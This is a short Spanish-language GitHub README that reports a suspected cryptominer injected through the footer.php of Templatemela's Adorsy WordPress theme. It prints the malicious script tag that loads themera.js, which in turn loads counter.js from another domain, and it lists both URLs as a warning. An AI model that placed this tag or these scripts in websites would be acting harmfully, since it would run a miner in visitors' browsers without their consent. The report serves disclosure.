# script-malicioso-templatemela-adorsy
Documentación sobre un script malicioso que encontré navegando en Wordpress

Trabajando junto con un amigo en un eCommerce, fuí alertado de la existencia de un Malware en la web que estábamos trabajando. La alerta vino del Antimalware en la PC de mi amigo, pensé que serí un falso negativo, pero revisando las llamadas de Red desde la consola del navegador, ví que es lo que sucedía.

Había un par scripts que tenían un comportamiento extraño por decir lo menos. El primero, `themera.js` llamaba a una página "https://themera.net/", la llamada estaba en el footer.php del Template elaborado por la empresa Templatemela. Concretamente en la plantilla Adorsy.

`<script type="text/javascript" src="//themera.net/embed/themera.js?id=76847"></script>`

Dentro de ese script se llamaba a otro `counter.js`, este último alojado en una web de Países Bajos "https://cleverjump.org/", al parecer había un Bitcoin Minner ese último script. https://urlscan.io/result/8f13ff7e-23f9-47dd-a8bb-c66eb2a76118 dejo los resultados de mi búsqueda. 

Actualmente (como pueden ver de hecho) no tengo tantos conocimientos para ir desarmando parte por parte el script y saber a ciencia cierta qué hace. Por eso lo dejo aquí en Git Hub como constancia de mi hallazgo.

Webs con los Script Maliciosos:
* https://cleverjump.org/counter.js
* https://themera.net/embed/themera.js?id=76847
